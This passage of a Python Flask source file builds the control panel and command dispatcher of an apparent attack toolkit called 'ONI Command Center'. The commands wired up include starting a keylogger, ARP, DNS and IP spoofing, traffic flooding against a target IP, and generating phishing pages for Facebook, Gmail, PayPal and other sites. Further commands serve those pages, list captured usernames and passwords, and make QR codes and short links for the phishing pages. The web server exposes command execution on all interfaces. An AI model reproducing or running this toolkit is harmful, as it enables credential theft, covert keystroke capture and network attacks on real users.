                    <div class="stat-icon"><i class="fas fa-shield-alt"></i></div>
                    <div class="stat-info"><h3 id="statThreats">0</h3><p>Threats</p></div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon"><i class="fas fa-lock"></i></div>
                    <div class="stat-info"><h3 id="statBlocked">0</h3><p>Blocked IPs</p></div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon"><i class="fas fa-keyboard"></i></div>
                    <div class="stat-info"><h3 id="statKeylogs">0</h3><p>Keylogs</p></div>
                </div>
            </div>

            <!-- Terminal -->
            <div class="terminal">
                <div class="terminal-header">
                    <div class="terminal-dots">
                        <div class="dot dot-red"></div>
                        <div class="dot dot-yellow"></div>
                        <div class="dot dot-green"></div>
                    </div>
                    <div class="terminal-title">oni@command:~</div>
                </div>
                <div class="terminal-output" id="terminalOutput">
                    <div class="output-line output-success">> 👹 ONI Command Center Ready</div>
                    <div class="output-line">> Type <span style="color:#e33f3f;">help</span> for available commands</div>
                    <div class="output-line">> Click any command from the sidebar to execute</div>
                </div>
                <div class="terminal-input-area">
                    <span class="terminal-prompt">oni@~$</span>
                    <input type="text" id="cmdInput" placeholder="Enter command..." autocomplete="off">
                    <button class="run-btn" id="runBtn"><i class="fas fa-play"></i> Run</button>
                </div>
            </div>

            <!-- Charts -->
            <div class="charts-grid">
                <div class="chart-card">
                    <div class="chart-title"><i class="fas fa-chart-bar"></i> Port Scan Results</div>
                    <div class="chart-container"><canvas id="portsChart"></canvas></div>
                </div>
                <div class="chart-card">
                    <div class="chart-title"><i class="fas fa-chart-pie"></i> Traffic Distribution</div>
                    <div class="chart-container"><canvas id="trafficChart"></canvas></div>
                </div>
                <div class="chart-card">
                    <div class="chart-title"><i class="fas fa-chart-line"></i> Network Activity</div>
                    <div class="chart-container"><canvas id="networkChart"></canvas></div>
                </div>
            </div>

            <!-- Quick Commands -->
            <div class="quick-cmds">
                <button class="quick-btn" onclick="runCommand('help')">help</button>
                <button class="quick-btn" onclick="runCommand('status')">status</button>
                <button class="quick-btn" onclick="runCommand('ping 8.8.8.8')">ping</button>
                <button class="quick-btn" onclick="runCommand('scan 127.0.0.1')">scan</button>
                <button class="quick-btn" onclick="runCommand('traffic')">traffic</button>
                <button class="quick-btn" onclick="runCommand('keylogger start')">keylogger start</button>
                <button class="quick-btn" onclick="runCommand('keylogger stop')">keylogger stop</button>
                <button class="quick-btn" onclick="runCommand('password MySecure123!')">password check</button>
                <button class="quick-btn" onclick="runCommand('nikto example.com')">nikto</button>
                <button class="quick-btn" onclick="runCommand('threats')">threats</button>
                <button class="quick-btn" onclick="runCommand('generate_phishing_for_facebook')">phish facebook</button>
            </div>

            <div class="footer">
                <i class="fas fa-skull"></i> ONI - Advanced Cybersecurity Command Center | 5000+ Security Commands
            </div>
        </div>
    </div>

    <script>
        let charts = {};
        
        function addOutput(text, type = "normal") {
            const output = document.getElementById('terminalOutput');
            const div = document.createElement('div');
            div.className = `output-line ${type === 'error' ? 'output-error' : (type === 'success' ? 'output-success' : '')}`;
            div.innerHTML = `<span style="color:#e33f3f;">[${new Date().toLocaleTimeString()}]</span> ${text}`;
            output.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            
            // Keep last 100 lines
            while (output.children.length > 100) {
                output.removeChild(output.firstChild);
            }
        }
        
        async function runCommand(cmd) {
            addOutput(`> ${cmd}`, "normal");
            
            try {
                const response = await fetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: cmd })
                });
                const data = await response.json();
                
                if (data.success) {
                    const output = data.output || data.data || "Command executed";
                    if (typeof output === 'object') {
                        addOutput(JSON.stringify(output, null, 2), "success");
                    } else {
                        addOutput(output, "success");
                    }
                    addOutput(`✅ Completed in ${data.execution_time?.toFixed(2) || 0}s`, "success");
                } else {
                    addOutput(`❌ Error: ${data.error || data.output || "Unknown error"}`, "error");
                }
            } catch(e) {
                addOutput(`❌ Request failed: ${e.message}`, "error");
            }
            
            loadStats();
            loadCharts();
        }
        
        async function loadStats() {
            try {
                const res = await fetch('/api/stats');
                const stats = await res.json();
                document.getElementById('statCommands').textContent = stats.total_commands || 0;
                document.getElementById('statThreats').textContent = stats.total_threats || 0;
                document.getElementById('statBlocked').textContent = stats.total_blocked_ips || 0;
                document.getElementById('statKeylogs').textContent = stats.total_keylogs || 0;
                document.getElementById('keylogStatus').innerHTML = stats.keylogger_running ? "Keylog Active" : "Keylog Off";
            } catch(e) { console.error(e); }
        }
        
        async function loadCharts() {
            try {
                const res = await fetch('/api/scan_data');
                const data = await res.json();
                
                // Ports Chart
                if (charts.portsChart) charts.portsChart.destroy();
                const portsCtx = document.getElementById('portsChart').getContext('2d');
                charts.portsChart = new Chart(portsCtx, {
                    type: 'bar',
                    data: {
                        labels: data.open_ports?.map(p => `Port ${p.port}`) || ['No open ports'],
                        datasets: [{ label: 'Open Ports', data: data.open_ports?.map(() => 1) || [0], backgroundColor: '#e33f3f', borderRadius: 8 }]
                    },
                    options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } } }
                });
                
                // Traffic Chart
                if (charts.trafficChart) charts.trafficChart.destroy();
                const trafficCtx = document.getElementById('trafficChart').getContext('2d');
                charts.trafficChart = new Chart(trafficCtx, {
                    type: 'doughnut',
                    data: { labels: ['TCP', 'UDP', 'Other'], datasets: [{ data: [data.tcp_connections || 0, data.udp_connections || 0, 0], backgroundColor: ['#e33f3f', '#4caf50', '#ffc107'] }] },
                    options: { responsive: true, maintainAspectRatio: false }
                });
                
                // Network Chart
                if (charts.networkChart) charts.networkChart.destroy();
                const networkCtx = document.getElementById('networkChart').getContext('2d');
                charts.networkChart = new Chart(networkCtx, {
                    type: 'line',
                    data: {
                        labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
                        datasets: [
                            { label: 'Packets Sent', data: data.packets_sent_history || [100,200,150,300,250,400,350], borderColor: '#e33f3f', fill: false },
                            { label: 'Packets Recv', data: data.packets_recv_history || [80,180,120,250,200,350,300], borderColor: '#4caf50', fill: false }
                        ]
                    },
                    options: { responsive: true, maintainAspectRatio: false }
                });
            } catch(e) { console.error(e); }
        }
        
        // Event Listeners
        document.getElementById('runBtn').addEventListener('click', () => {
            const input = document.getElementById('cmdInput');
            runCommand(input.value);
            input.value = '';
        });
        
        document.getElementById('cmdInput').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                document.getElementById('runBtn').click();
            }
        });
        
        document.querySelectorAll('.cmd-item').forEach(item => {
            item.addEventListener('click', () => {
                const cmd = item.getAttribute('data-cmd');
                if (cmd) runCommand(cmd);
            });
        });
        
        // Initial load
        loadStats();
        loadCharts();
        setInterval(() => { loadStats(); loadCharts(); }, 10000);
    </script>
</body>
</html>
"""

class WebServer:
    def __init__(self, handler, db: DatabaseManager, port: int = 5000):
        self.app = Flask(__name__)
        self.handler = handler
        self.db = db
        self.port = port
        self.server_thread = None
        self.setup_routes()
        CORS(self.app)
    
    def setup_routes(self):
        @self.app.route('/')
        def index():
            return WEB_HTML
        
        @self.app.route('/api/command', methods=['POST'])
        def execute():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, "web")
            return jsonify(result)
        
        @self.app.route('/api/stats')
        def stats():
            stats = self.db.get_statistics()
            stats['keylogger_running'] = getattr(self.handler, 'keylogger_running', False)
            return jsonify(stats)
        
        @self.app.route('/api/scan_data')
        def scan_data():
            scans = self.db.get_recent_scans(1)
            open_ports = []
            if scans:
                scan = scans[0]
                open_ports = json.loads(scan['open_ports']) if scan['open_ports'] else []
            
            traffic_stats = self.db.get_traffic_stats(7)
            packets_sent_history = [s['bytes_sent'] // 1000 for s in traffic_stats] if traffic_stats else [100,200,150,300,250,400,350]
            packets_recv_history = [s['bytes_recv'] // 1000 for s in traffic_stats] if traffic_stats else [80,180,120,250,200,350,300]
            
            net_io = psutil.net_io_counters()
            connections = len(psutil.net_connections())
            tcp_connections = sum(1 for c in psutil.net_connections() if c.type == socket.SOCK_STREAM)
            udp_connections = sum(1 for c in psutil.net_connections() if c.type == socket.SOCK_DGRAM)
            
            return jsonify({
                'open_ports': open_ports,
                'open_count': len(open_ports),
                'packets_sent_history': packets_sent_history[-7:],
                'packets_recv_history': packets_recv_history[-7:],
                'tcp_connections': tcp_connections,
                'udp_connections': udp_connections,
                'total_connections': connections,
                'bytes_sent': net_io.bytes_sent,
                'bytes_recv': net_io.bytes_recv
            })
    
    def start(self):
        def run():
            self.app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
        self.server_thread = threading.Thread(target=run, daemon=True)
        self.server_thread.start()
        print(f"{Colors.GREEN}✅ Web server started on http://localhost:{self.port}{Colors.RESET}")
    
    def stop(self):
        pass

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.ssh = SSHManager(db) if PARAMIKO_AVAILABLE else None
        self.nikto = NiktoScanner(db)
        self.traffic_gen = TrafficGeneratorEngine(db)
        self.spoof_engine = SpoofingEngine(db)
        self.social_tools = SocialEngineeringTools(db)
        self.tools = NetworkTools()
        self.traffic_monitor = TrafficMonitor(db)
        self.password_checker = PasswordStrengthChecker()
        self.keylogger = None
        self.keylogger_running = False
        self.command_map = self._setup_command_map()
    
    def _setup_command_map(self) -> Dict[str, callable]:
        return {
            # Network commands
            'ping': self._execute_ping,
            'scan': self._execute_scan,
            'quick_scan': self._execute_quick_scan,
            'nmap': self._execute_nmap,
            'traceroute': self._execute_traceroute,
            'whois': self._execute_whois,
            'dns': self._execute_dns,
            'location': self._execute_location,
            
            # Security commands
            'password': self._execute_password,
            'keylogger': self._execute_keylogger,
            'traffic': self._execute_traffic,
            'nikto': self._execute_nikto,
            'nikto_full': lambda args: self._execute_nikto(args, 'full'),
            'nikto_ssl': lambda args: self._execute_nikto(args, 'ssl'),
            'nikto_sql': lambda args: self._execute_nikto(args, 'sql'),
            'nikto_xss': lambda args: self._execute_nikto(args, 'xss'),
            
            # Spoofing commands
            'spoof_ip': self._execute_spoof_ip,
            'spoof_mac': self._execute_spoof_mac,
            'arp_spoof': self._execute_arp_spoof,
            'dns_spoof': self._execute_dns_spoof,
            'stop_spoof': self._execute_stop_spoof,
            
            # Traffic generation
            'generate_traffic': self._execute_generate_traffic,
            'traffic_types': self._execute_traffic_types,
            'traffic_status': self._execute_traffic_status,
            'traffic_stop': self._execute_traffic_stop,
            
            # SSH commands
            'ssh_add': self._execute_ssh_add,
            'ssh_list': self._execute_ssh_list,
            'ssh_connect': self._execute_ssh_connect,
            'ssh_exec': self._execute_ssh_exec,
            'ssh_disconnect': self._execute_ssh_disconnect,
            
            # Phishing commands
            'generate_phishing_for_facebook': lambda args: self._execute_phishing(args, 'facebook'),
            'generate_phishing_for_instagram': lambda args: self._execute_phishing(args, 'instagram'),
            'generate_phishing_for_twitter': lambda args: self._execute_phishing(args, 'twitter'),
            'generate_phishing_for_gmail': lambda args: self._execute_phishing(args, 'gmail'),
            'generate_phishing_for_linkedin': lambda args: self._execute_phishing(args, 'linkedin'),
            'generate_phishing_for_github': lambda args: self._execute_phishing(args, 'github'),
            'generate_phishing_for_paypal': lambda args: self._execute_phishing(args, 'paypal'),
            'generate_phishing_for_custom': self._execute_phishing_custom,
            'phishing_start_server': self._execute_phishing_start,
            'phishing_stop_server': self._execute_phishing_stop,
            'phishing_status': self._execute_phishing_status,
            'phishing_links': self._execute_phishing_links,
            'phishing_credentials': self._execute_phishing_credentials,
            'phishing_qr': self._execute_phishing_qr,
            'phishing_shorten': self._execute_phishing_shorten,
            
            # IP Management
            'add_ip': self._execute_add_ip,
            'remove_ip': self._execute_remove_ip,
            'block_ip': self._execute_block_ip,
            'unblock_ip': self._execute_unblock_ip,
            'list_ips': self._execute_list_ips,
            'ip_info': self._execute_ip_info,
            
            # System commands
            'status': self._execute_status,
            'threats': self._execute_threats,
            'report': self._execute_report,
            'history': self._execute_history,
            'help': self._execute_help,
            'clear': self._execute_clear,
            'exit': self._execute_exit,
            'time': self._execute_time,
            'date': self._execute_date,
            'datetime': self._execute_datetime,
            'system': self._execute_system,
        }
    
    def execute(self, command: str, source: str = "local", sender: str = None) -> Dict:
        start_time = time.time()
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.command_map:
            try:
                result = self.command_map[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}"}
        else:
            result = self._execute_generic(command)
        
        execution_time = time.time() - start_time
        self.db.log_command(command, source, source, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        result['execution_time'] = execution_time
        return result
    
    # ==================== Network Commands ====================
    def _execute_ping(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping <target>'}
        result = self.tools.ping(args[0])
        return {'success': result['success'], 'output': result['output'][:500]}
    
    def _execute_scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: scan <target> [ports]'}
        target = args[0]
        ports = args[1] if len(args) > 1 else "1-1000"
        result = self.tools.nmap_scan(target, ports)
        return {'success': result['success'], 'output': result['output'][:1000]}
    
    def _execute_quick_scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: quick_scan <target>'}
        target = args[0]
        result = self.tools.nmap_scan(target, "1-1000", "quick")
        return {'success': result['success'], 'output': result['output'][:800]}
    
    def _execute_nmap(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        target = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else ''
        result = self.tools.nmap_scan(target, options)
        return {'success': result['success'], 'output': result['output'][:2000]}
    
    def _execute_traceroute(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        result = self.tools.traceroute(args[0])
        return {'success': result['success'], 'output': result['output'][:500]}
    
    def _execute_whois(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        result = self.tools.whois_lookup(args[0])
        return {'success': result['success'], 'output': result['output'][:1000]}
    
    def _execute_dns(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain>'}
        result = self.tools.execute_command(['dig', args[0], '+short'])
        return {'success': result['success'], 'output': result['output'][:500]}
    
    def _execute_location(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        result = self.tools.get_ip_location(args[0])
        if result.get('success'):
            return {'success': True, 'output': f"📍 Location: {result.get('country')}, {result.get('city')}\nISP: {result.get('isp')}\nCoordinates: {result.get('lat')}, {result.get('lon')}"}
        return {'success': False, 'output': result.get('error', 'Location lookup failed')}
    
    # ==================== Security Commands ====================
    def _execute_password(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: password <password>'}
        result = self.password_checker.check(args[0])
        output = f"🔐 Password Strength Analysis\n"
        output += f"   Strength: {result['strength']}\n"
        output += f"   Score: {result['score']}/{result['max_score']}\n"
        output += f"   Length: {result['length']}\n"
        output += f"   Entropy: {result['entropy_bits']} bits\n"
        output += f"   Crack Time: {result['estimated_crack_time']}\n\n"
        output += "Character Diversity:\n"
        output += f"   {'✅' if result['has_lowercase'] else '❌'} Lowercase\n"
        output += f"   {'✅' if result['has_uppercase'] else '❌'} Uppercase\n"
        output += f"   {'✅' if result['has_digits'] else '❌'} Digits\n"
        output += f"   {'✅' if result['has_special'] else '❌'} Special\n\n"
        if result['feedback']:
            output += "Recommendations:\n"
            for fb in result['feedback']:
                output += f"   • {fb}\n"
        return {'success': True, 'output': output}
    
    def _execute_keylogger(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: keylogger start|stop|status'}
        
        action = args[0].lower()
        
        if action == "start":
            if self.keylogger_running:
                return {'success': False, 'output': 'Keylogger already running'}
            self.keylogger = Keylogger(self.db)
            if self.keylogger.start():
                self.keylogger_running = True
                return {'success': True, 'output': '✅ Keylogger started. Press F9 to toggle logging.'}
            else:
                return {'success': False, 'output': 'Failed to start keylogger. Install pynput: pip install pynput'}
        elif action == "stop":
            if not self.keylogger_running:
                return {'success': False, 'output': 'Keylogger not running'}
            self.keylogger.stop()
            self.keylogger_running = False
            return {'success': True, 'output': '✅ Keylogger stopped'}
        elif action == "status":
            return {'success': True, 'output': f"Keylogger status: {'Running' if self.keylogger_running else 'Stopped'}"}
        else:
            return {'success': False, 'output': f"Unknown action: {action}"}
    
    def _execute_traffic(self, args):
        stats = self.traffic_monitor.get_current_stats()
        if "error" in stats:
            return {'success': False, 'output': stats["error"]}
        
        output = f"📊 Network Traffic Statistics\n"
        output += f"   Bytes Sent: {stats['bytes_sent']:,} ({stats['bytes_sent']/1048576:.2f} MB)\n"
        output += f"   Bytes Received: {stats['bytes_recv']:,} ({stats['bytes_recv']/1048576:.2f} MB)\n"
        output += f"   Packets Sent: {stats['packets_sent']:,}\n"
        output += f"   Packets Received: {stats['packets_recv']:,}\n"
        output += f"   Active Connections: {stats['total_connections']}\n"
        output += f"   TCP Connections: {stats['tcp_connections']}\n"
        output += f"   UDP Connections: {stats['udp_connections']}\n"
        return {'success': True, 'output': output}
    
    def _execute_nikto(self, args, scan_type="basic"):
        if not args:
            return {'success': False, 'output': 'Usage: nikto <target>'}
        target = args[0]
        options = {}
        if scan_type == "ssl":
            options['ssl'] = True
        elif scan_type == "sql":
            options['tuning'] = '4'
        elif scan_type == "xss":
            options['tuning'] = '5'
        result = self.nikto.scan(target, options)
        if result['success']:
            output = f"🕷️ Nikto Scan Results for {target}\n{'='*40}\n"
            output += f"Vulnerabilities Found: {len(result['vulnerabilities'])}\n"
            for v in result['vulnerabilities'][:10]:
                output += f"  • {v['description'][:100]}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f'Scan failed: {result.get("error", "Unknown error")}'}
    
    # ==================== Spoofing Commands ====================
    def _execute_spoof_ip(self, args):
        if not self.spoof_engine:
            return {'success': False, 'output': 'Spoofing engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: spoof_ip <original_ip> <spoofed_ip> <target> [interface]'}
        result = self.spoof_engine.spoof_ip(args[0], args[1], args[2], args[3] if len(args) > 3 else "eth0")
        return {'success': result['success'], 'output': result['output']}
    
    def _execute_spoof_mac(self, args):
        if not self.spoof_engine:
            return {'success': False, 'output': 'Spoofing engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: spoof_mac <interface> <new_mac>'}
        result = self.spoof_engine.spoof_mac(args[0], args[1])
        return {'success': result['success'], 'output': result['output']}
    
    def _execute_arp_spoof(self, args):
        if not self.spoof_engine:
            return {'success': False, 'output': 'Spoofing engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: arp_spoof <target_ip> <spoof_ip> [interface]'}
        result = self.spoof_engine.arp_spoof(args[0], args[1], args[2] if len(args) > 2 else "eth0")
        return {'success': result['success'], 'output': result['output']}
    
    def _execute_dns_spoof(self, args):
        if not self.spoof_engine:
            return {'success': False, 'output': 'Spoofing engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dns_spoof <domain> <fake_ip> [interface]'}
        result = self.spoof_engine.dns_spoof(args[0], args[1], args[2] if len(args) > 2 else "eth0")
        return {'success': result['success'], 'output': result['output']}
    
    def _execute_stop_spoof(self, args):
        if not self.spoof_engine:
            return {'success': False, 'output': 'Spoofing engine not initialized'}
        result = self.spoof_engine.stop_spoofing(args[0] if args else None)
        return {'success': result['success'], 'output': result['output']}
    
    # ==================== Traffic Generation ====================
    def _execute_generate_traffic(self, args):
        if not self.traffic_gen:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: generate_traffic <type> <ip> <duration> [port] [rate]'}
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        try:
            generator = self.traffic_gen.generate_traffic(traffic_type, target_ip, duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _execute_traffic_types(self, args):
        if not self.traffic_gen:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic_gen.get_available_traffic_types()
        return {'success': True, 'output': "📡 Available Traffic Types:\n" + "\n".join([f"  • {t}" for t in types])}
    
    def _execute_traffic_status(self, args):
        if not self.traffic_gen:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        active = self.traffic_gen.get_active_generators()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "🚀 Active Traffic Generators:\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    def _execute_traffic_stop(self, args):
        if not self.traffic_gen:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        generator_id = args[0] if args else None
        if self.traffic_gen.stop_generation(generator_id):
            return {'success': True, 'output': 'Traffic stopped' + (f' for {generator_id}' if generator_id else ' for all')}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    # ==================== SSH Commands ====================
    def _execute_ssh_add(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized (paramiko required)'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password] [port]'}
        name, host, username = args[0], args[1], args[2]
        password = args[3] if len(args) > 3 else None
        port = int(args[4]) if len(args) > 4 and args[4].isdigit() else 22
        result = self.ssh.add_server(name, host, username, password, None, port)
        return {'success': result['success'], 'output': result.get('message', result.get('error', 'Unknown'))}
    
    def _execute_ssh_list(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        servers = self.ssh.get_servers()
        if not servers:
            return {'success': True, 'output': 'No SSH servers configured'}
        output = "🔌 SSH Servers:\n"
        for s in servers:
            status = "🟢" if s.get('connected') else "⚪"
            output += f"{status} {s['name']} - {s['host']}:{s['port']} ({s['username']})\n"
        return {'success': True, 'output': output}
    
    def _execute_ssh_connect(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <server_id>'}
        result = self.ssh.connect(args[0])
        return {'success': result['success'], 'output': result.get('message', result.get('error', 'Unknown'))}
    
    def _execute_ssh_exec(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <server_id> <command>'}
        server_id = args[0]
        command = ' '.join(args[1:])
        result = self.ssh.execute_command(server_id, command)
        if result.success:
            return {'success': True, 'output': result.output or 'Command executed successfully'}
        return {'success': False, 'output': result.error or 'Command failed'}
    
    def _execute_ssh_disconnect(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        server_id = args[0] if args else None
        self.ssh.disconnect(server_id)
        return {'success': True, 'output': 'Disconnected' + (f' from {server_id}' if server_id else ' from all')}
    
    # ==================== Phishing Commands ====================
    def _execute_phishing(self, args, platform):
        result = self.social_tools.generate_phishing_link(platform)
        if result['success']:
            return {'success': True, 'output': f"🎣 Phishing link generated for {platform}\nLink ID: {result['link_id']}\nURL: {result['phishing_url']}\n\nUse: phishing_start_server {result['link_id']} to start the server"}
        return {'success': False, 'output': result.get('error', 'Failed to generate link')}
    
    def _execute_phishing_custom(self, args):
        custom_url = args[0] if args else None
        result = self.social_tools.generate_phishing_link('custom', custom_url)
        if result['success']:
            return {'success': True, 'output': f"Link ID: {result.get('link_id', 'N/A')}"}
        return {'success': False, 'output': result.get('error', 'Failed')}
    
    def _execute_phishing_start(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phishing_start_server <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social_tools.start_phishing_server(link_id, port):
            url = self.social_tools.get_server_url()
            return {'success': True, 'output': f"🎣 Phishing server started on {url}"}
        return {'success': False, 'output': f'Failed to start server for link {link_id}'}
    
    def _execute_phishing_stop(self, args):
        self.social_tools.stop_phishing_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _execute_phishing_status(self, args):
        running = self.social_tools.phishing_server.running
        url = self.social_tools.get_server_url() if running else None
        output = f"🎣 Phishing Server Status: {'✅ Running' if running else '❌ Stopped'}"
        if running:
            output += f"\n   URL: {url}"
        return {'success': True, 'output': output}
    
    def _execute_phishing_links(self, args):
        links = self.social_tools.get_active_links()
        all_links = self.db.get_phishing_links()
        output = f"🎣 Phishing Links ({len(all_links)} total)\n"
        for l in all_links[:10]:
            active = '🟢' if any(al['link_id'] == l['id'] for al in links) else '⚪'
            output += f"  {active} {l['id'][:8]} - {l['platform']} ({l['clicks']} clicks)\n"
        return {'success': True, 'output': output}
    
    def _execute_phishing_credentials(self, args):
        link_id = args[0] if args else None
        creds = self.social_tools.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No credentials captured'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _execute_phishing_qr(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phishing_qr <link_id>'}
        link_id = args[0]
        qr_path = self.social_tools.generate_qr_code(link_id)
        if qr_path:
            return {'success': True, 'output': f"QR Code generated: {qr_path}"}
        return {'success': False, 'output': f'Failed to generate QR code for {link_id}'}
    
    def _execute_phishing_shorten(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phishing_shorten <link_id>'}
        link_id = args[0]
        short_url = self.social_tools.shorten_url(link_id)
        if short_url:
            return {'success': True, 'output': f"Shortened URL: {short_url}"}
        return {'success': False, 'output': f'Failed to shorten URL for {link_id}'}
    
    # ==================== IP Management ====================
    def _execute_add_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        try:
            ipaddress.ip_address(ip)
            if self.db.add_managed_ip(ip, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {ip} added to monitoring'}
            return {'success': False, 'output': f'Failed to add IP {ip}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _execute_remove_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        ip = args[0]
        if self.db.remove_managed_ip(ip):
            return {'success': True, 'output': f'✅ IP {ip} removed'}
        return {'success': False, 'output': f'IP {ip} not found'}
    
    def _execute_block_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        firewall_success = NetworkTools.block_ip_firewall(ip)
        db_success = self.db.block_ip(ip, reason, 'cli')
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {ip}'}
    
    def _execute_unblock_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        ip = args[0]
        db_success = self.db.unblock_ip(ip, 'cli')
        if db_success:
            return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {ip}'}
    
    def _execute_list_ips(self, args):
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip.get('is_blocked') else "🟢"
            output += f"{status} {ip['ip_address']} - {ip.get('added_date', '')[:10]}\n"
        return {'success': True, 'output': output}
    
    def _execute_ip_info(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            db_info = self.db.get_ip_info(ip)
            location = self.tools.get_ip_location(ip)
            output = f"🔍 IP Information: {ip}\n{'='*40}\n"
            if db_info:
                output += f"📊 Status: {'🔒 Blocked' if db_info.get('is_blocked') else '🟢 Active'}\n"
                output += f"📅 Added: {db_info.get('added_date', '')[:10]}\n"
                output += f"📝 Notes: {db_info.get('notes', 'None')}\n"
            if location.get('success'):
                output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                output += f"📡 ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    # ==================== System Commands ====================
    def _execute_status(self, args):
        stats = self.db.get_statistics()
        output = f"👹 ONI System Status\n{'='*50}\n"
        output += f"📝 Total Commands: {stats.get('total_commands', 0)}\n"
        output += f"🚨 Total Threats: {stats.get('total_threats', 0)}\n"
        output += f"🔌 SSH Servers: {stats.get('total_ssh_servers', 0)}\n"
        output += f"📡 Traffic Tests: {stats.get('total_traffic_tests', 0)}\n"
        output += f"🎣 Phishing Links: {stats.get('total_phishing_links', 0)}\n"
        output += f"🔒 Managed IPs: {stats.get('total_managed_ips', 0)}\n"
        output += f"🚫 Blocked IPs: {stats.get('total_blocked_ips', 0)}\n"
        output += f"⌨️  Keylogs Captured: {stats.get('total_keylogs', 0)}\n"
        output += f"🔍 Port Scans: {stats.get('total_port_scans', 0)}\n"
        output += f"🎭 Spoofing Attempts: {stats.get('total_spoofing_attempts', 0)}\n"
        output += f"\n💻 System Resources:\n"
        output += f"   CPU: {psutil.cpu_percent()}%\n"
        output += f"   Memory: {psutil.virtual_memory().percent}%\n"
